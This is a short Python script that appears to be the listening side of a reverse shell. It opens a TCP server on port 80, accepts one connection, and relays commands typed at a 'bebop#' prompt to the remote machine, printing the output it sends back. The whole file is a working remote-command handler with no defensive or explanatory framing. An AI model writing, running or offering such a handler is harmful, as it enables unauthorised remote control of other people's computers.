import socket
import sys
import threading

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 80))
    server.listen(0)

    print("Waiting on connections")
    conn_to_client, address = server.accept()

    if conn_to_client:
        print(f"Connection to {address[0]}:{address[1]} Established!")

        while conn_to_client:
            cmd = input("bebop#: ")
            conn_to_client.sendall(cmd.encode())

            output = conn_to_client.recv(1024)
            print(output.decode())
    else:
        sys.exit("Could not establish connection")

main()
